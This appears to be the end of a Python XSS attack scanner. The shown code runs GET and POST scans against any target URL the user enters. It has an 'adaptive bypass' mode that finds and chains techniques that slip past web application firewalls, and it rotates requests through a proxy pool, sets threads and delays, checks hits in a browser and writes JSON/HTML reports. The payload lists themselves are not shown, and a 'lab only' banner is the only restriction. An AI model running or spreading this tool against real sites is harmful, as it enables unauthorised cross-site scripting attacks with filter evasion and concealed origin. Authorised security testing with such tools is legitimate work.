                    print(f"  {C.GRN}[{i}] {'+'.join(techs)[:55]:<55} -> OK ({ref}){C.R}")
                    if r.get("reflected"):
                        self._add_finding("+".join(techs), mutated, r["context"], r["status"], r.get("confirmed"))

    def scan(self, on_result=None):
        print(f"\n  {C.PUR}{'-'*60}{C.R}")
        print(f"  {C.B}{C.WHT}ADAPTIVE BYPASS MODE{C.R}")
        print(f"  {C.PUR}{'-'*60}{C.R}\n")
        print(f"  {C.NEO}Target:{C.R} {self.url}")
        print(f"  {C.NEO}Method:{C.R} {self.method}")
        print(f"  {C.NEO}Field: {C.R}{self.field}")
        print(f"  {C.NEO}Marker:{C.R} {self.marker}")
        print(f"  {C.NEO}Alert: {C.R}{ALERT_TYPE['mode']}")
        print(f"  {C.NEO}Proxy: {C.R}{self.pool.alive()}/{self.pool.total()} alive")
        print(f"  {C.NEO}Delay: {C.R}{self.delay}s\n")

        self._probe_base()
        self._probe_techniques()

        print(f"\n  {C.NEO}Working:{C.R} {C.GRN}{', '.join(self.working) or 'none'}{C.R}")
        print(f"  {C.NEO}Blocked:{C.R} {C.CRM}{', '.join(self.blocked_list) or 'none'}{C.R}")

        if len(self.working) >= 2:
            self._chain_working()
        else:
            print(f"\n  {C.YEL}[!] Few working techniques -> escalation{C.R}")

        if not self.results:
            self._escalate()

        if on_result:
            for r in self.results:
                on_result(r)
        return self.results


def to_json(results, url, marker, method):
    return json.dumps({
        "scan_time": datetime.now().isoformat(), "target": url,
        "method": method, "marker": marker, "alert_type": ALERT_TYPE["mode"],
        "total": len(results), "findings": results,
    }, indent=2, ensure_ascii=False)


def to_html(results, url, marker, method):
    import html as H
    rows = []
    for i, f in enumerate(results, 1):
        c = f.get("confirmed")
        c_txt = "VERIFIED" if c is True else ("REFLECT-ONLY" if c is False else "-")
        c_col = "#4ade80" if c is True else ("#fbbf24" if c is False else "#9ca3af")
        rows.append(f"""<tr>
<td>{i}</td><td>{f['severity']}</td>
<td style="color:{c_col};font-weight:bold">{c_txt}</td>
<td>{H.escape(f['method'])}</td>
<td>{H.escape(f.get('field','-'))}</td>
<td><code>{H.escape(f['tag'][:80])}</code></td>
<td>{H.escape(f['context'] or '-')}</td>
<td><pre>{H.escape(f['payload'][:200])}</pre></td>
<td>{f['status']}</td></tr>""")
    body = "".join(rows) or "<tr><td colspan='9'>No findings</td></tr>"
    return f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>Report</title>
<style>body{{font-family:Tahoma;background:#0f0f1e;color:#e0e0e0;padding:30px}}
h1{{color:#e94560}}table{{width:100%;border-collapse:collapse;background:#16213e}}
th,td{{padding:10px;text-align:left;border-bottom:1px solid #222;font-size:12px;vertical-align:top}}
th{{background:#0f0f1e;color:#4ade80}}pre{{background:#0f0f1e;padding:8px;color:#fbbf24;font-size:11px;overflow-x:auto}}
code{{background:#0f0f1e;padding:3px 8px;color:#9ca3af}}</style></head><body>
<h1>XSS Report</h1>
<p>Target: {H.escape(url)} | Method: {H.escape(method)} | Alert: {H.escape(ALERT_TYPE['mode'])} | Findings: {len(results)}</p>
<table><thead><tr><th>#</th><th>Sev</th><th>Confirmed</th><th>Method</th><th>Field</th>
<th>Techniques</th><th>Context</th><th>Payload</th><th>Status</th></tr></thead>
<tbody>{body}</tbody></table></body></html>"""


def clear():
    os.system("clear" if os.name == "posix" else "cls")


def banner():
    clear()
    print(f"""{C.PUR}{C.B}
  XSS Scanner
{C.R}""")
    print(f"{C.NEO}{C.B}{'XSS Scanner + Smart Payloads + Browser Verify'.center(66)}{C.R}")
    print(f"{C.CRM}{'LAB ONLY - AUTHORIZED TESTING'.center(66)}{C.R}\n")


def print_finding(res):
    sev = res.get("severity", "LOW")
    color = C.RED if sev == "HIGH" else (C.YEL if sev == "MEDIUM" else C.GRN)
    c = res.get("confirmed")
    if c is True:
        badge = f"{C.GRN}[VERIFIED]{C.R}"
    elif c is False:
        badge = f"{C.YEL}[REFLECT-ONLY]{C.R}"
    else:
        badge = f"{C.D}[UNVERIFIED]{C.R}"
    print(f"  {color}[{sev:<6}]{C.R} {badge} {C.GLD}{res['method']:<4}{C.R} "
          f"{C.NEO}{res.get('field','-'):<10}{C.R} {C.CYN}{res['context'] or '-':<12}{C.R}")
    print(f"      {C.D}tech: {res['tag'][:80]}{C.R}")
    print(f"      {C.WHT}{res['payload'][:140]}{C.R}")


def ask_attack():
    print(f"\n{C.NEO}Threads{C.R} {C.D}(default 5){C.R}: ", end="")
    t = input().strip()
    threads = int(t) if t.isdigit() else 5
    threads = max(1, min(20, threads))

    print(f"{C.NEO}Delay sec{C.R} {C.D}(default 0.2){C.R}: ", end="")
    d = input().strip()
    try: delay = float(d) if d else 0.2
    except ValueError: delay = 0.2

    print(f"\n{C.NEO}Send mode{C.R}")
    print(f"  {C.GLD}1{C.R}  Auto (all at once)")
    print(f"  {C.GLD}2{C.R}  Batched")
    print(f"  {C.GLD}3{C.R}  Manual")
    print(f"{C.GLD}>>{C.R} ", end="")
    mode = input().strip() or "1"

    batch_size = 0; manual = False
    if mode == "2":
        print(f"{C.NEO}Batch size{C.R} {C.D}(e.g. 100){C.R}: ", end="")
        b = input().strip()
        batch_size = int(b) if b.isdigit() and int(b) > 0 else 100
    elif mode == "3":
        manual = True

    return threads, delay, batch_size, manual


def save_results(results, url, marker, method):
    if not results: return
    print(f"\n{C.GLD}Save report?{C.R} {C.D}(y/n){C.R}: ", end="")
    if input().strip().lower() != "y": return
    os.makedirs("output", exist_ok=True)
    ts = int(time.time())
    jp = f"output/xss_{ts}.json"
    hp = f"output/xss_{ts}.html"
    with open(jp, "w", encoding="utf-8") as f: f.write(to_json(results, url, marker, method))
    with open(hp, "w", encoding="utf-8") as f: f.write(to_html(results, url, marker, method))
    print(f"  {C.GRN}[+] JSON: {jp}{C.R}")
    print(f"  {C.GRN}[+] HTML: {hp}{C.R}")


def run_scan(method_type="GET", adaptive=False):
    label = "ADAPTIVE BYPASS" if adaptive else "NORMAL"
    print(f"\n{C.PUR}{'='*70}{C.R}")
    print(f"{C.B}{C.WHT}  {method_type} {label} SCAN{C.R}")
    print(f"{C.PUR}{'='*70}{C.R}\n")

    url = input(f"{C.NEO}Target URL{C.R}\n{C.GLD}>>{C.R} ").strip()
    if not url: return
    if not url.startswith(("http://","https://")): url = "http://" + url

    data = None
    if method_type == "POST":
        print(f"\n{C.NEO}POST fields{C.R} {C.D}(name=value, comma separated){C.R}")
        print(f"{C.GLD}>>{C.R} ", end="")
        raw = input().strip()
        data = {}
        for part in raw.split(","):
            if "=" in part:
                k, v = part.split("=", 1); data[k.strip()] = v.strip()
        if not data:
            print(f"{C.CRM}[!] No valid fields{C.R}")
            input(f"\n{C.D}Enter...{C.R}"); return

    ask_alert_type()
    pool = ask_proxies()
    threads, delay, batch, manual = ask_attack()

    USE_BROWSER_VERIFY["enabled"] = ask_browser_verify()
    if USE_BROWSER_VERIFY["enabled"]:
        print(f"  {C.GRN}[+] Browser verification ENABLED{C.R}")
    else:
        print(f"  {C.YEL}[!] Browser verification DISABLED (fast mode){C.R}")

    try:
        if adaptive:
            sc = AdaptiveBypass(url, method=method_type, data=data,
                                pool=pool, threads=threads, delay=delay)
        else:
            sc = BypassScanner(url, method=method_type, data=data,
                               pool=pool, threads=threads, delay=delay,
                               batch_size=batch)
    except ValueError as e:
        print(f"{C.CRM}[!] {e}{C.R}")
        input(f"\n{C.D}Enter...{C.R}"); return

    print(f"\n{C.PUR}{'='*70}{C.R}")
    print(f"{C.B}{C.WHT}  SCAN START{C.R}")
    print(f"{C.PUR}{'='*70}{C.R}\n")

    start = time.time()
    if adaptive:
        results = sc.scan(on_result=print_finding)
    else:
        results = sc.scan(on_result=print_finding, manual=manual)
    elapsed = time.time() - start

    print(f"\n{C.PUR}{'='*70}{C.R}")
    print(f"{C.B}{C.WHT}  COMPLETE{C.R}")
    print(f"{C.PUR}{'='*70}{C.R}\n")
    print(f"  {C.NEO}Time:      {C.R}{elapsed:.2f}s")
    print(f"  {C.NEO}Sent:      {C.R}{sc.counter['sent']}")
    print(f"  {C.NEO}OK:        {C.R}{C.GRN}{sc.counter['ok']}{C.R}")
    print(f"  {C.NEO}Blocked:   {C.R}{C.YEL}{sc.counter['blocked']}{C.R}")
    print(f"  {C.NEO}Errors:    {C.R}{sc.counter['errors']}")
    print(f"  {C.NEO}Reflected: {C.R}{C.GRN}{sc.counter['reflected']}{C.R}")
    print(f"  {C.NEO}Verified:  {C.R}{C.GRN}{sc.counter.get('verified',0)}{C.R}")
    print(f"  {C.NEO}Proxies:   {C.R}{sc.pool.alive()}/{sc.pool.total()} alive")

    if adaptive:
        if sc.working:
            print(f"\n  {C.GRN}[+] Working: {', '.join(sc.working)}{C.R}")
        if sc.blocked_list:
            print(f"  {C.CRM}[-] Blocked: {', '.join(sc.blocked_list[:8])}{C.R}")
    elif hasattr(sc, "waf_hits") and sc.waf_hits:
        print(f"\n  {C.GLD}Top blocking:{C.R}")
        for tag, count in sorted(sc.waf_hits.items(), key=lambda x: -x[1])[:5]:
            print(f"    {C.CRM}{count:>4}x {C.R}{tag[:60]}")

    if results:
        verified = [r for r in results if r.get("confirmed") is True]
        reflect_only = [r for r in results if r.get("confirmed") is False]
        print(f"\n{C.GRN}{C.B}[+] {len(results)} findings!{C.R}")
        if verified:
            print(f"  {C.GRN}[+] VERIFIED XSS: {len(verified)}{C.R}")
        if reflect_only:
            print(f"  {C.YEL}[x] Reflect-only: {len(reflect_only)}{C.R}")
        by_sev = {}
        for r in results: by_sev[r["severity"]] = by_sev.get(r["severity"], 0) + 1
        for sev in ("HIGH","MEDIUM","LOW"):
            if sev in by_sev:
                print(f"  {C.GLD}{sev}{C.R}: {by_sev[sev]}")
        save_results(results, url, sc.marker, sc.method)
    else:
        print(f"\n{C.YEL}[!] No findings{C.R}")

    input(f"\n{C.D}Enter...{C.R}")


def run():
    while True:
        banner()
        print(f"{C.PUR}+{'-'*62}+{C.R}")
        print(f"{C.PUR}|{C.R}  {C.GLD}1{C.R}  {C.NEO}Scan GET  (normal){C.R}                     {C.PUR}|{C.R}")
        print(f"{C.PUR}|{C.R}  {C.GLD}2{C.R}  {C.NEO}Scan POST (normal){C.R}                     {C.PUR}|{C.R}")
        print(f"{C.PUR}|{C.R}  {C.GLD}3{C.R}  {C.YEL}Scan GET  (BYPASS){C.R}                     {C.PUR}|{C.R}")
        print(f"{C.PUR}|{C.R}  {C.GLD}4{C.R}  {C.YEL}Scan POST (BYPASS){C.R}                     {C.PUR}|{C.R}")
        print(f"{C.PUR}|{C.R}  {C.GLD}0{C.R}  {C.CRM}Exit{C.R}                                   {C.PUR}|{C.R}")
        print(f"{C.PUR}+{'-'*62}+{C.R}")
        print(f"\n{C.GLD}{C.B}>>{C.R} ", end="")
        c = input().strip()

        if c == "0":
            print(f"{C.CRM}Bye{C.R}"); break
        elif c == "1":
            run_scan("GET", adaptive=False)
        elif c == "2":
            run_scan("POST", adaptive=False)
        elif c == "3":
            run_scan("GET", adaptive=True)
        elif c == "4":
            run_scan("POST", adaptive=True)
        else:
            print(f"{C.CRM}[!] Invalid{C.R}"); time.sleep(1)


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{C.CRM}Bye{C.R}")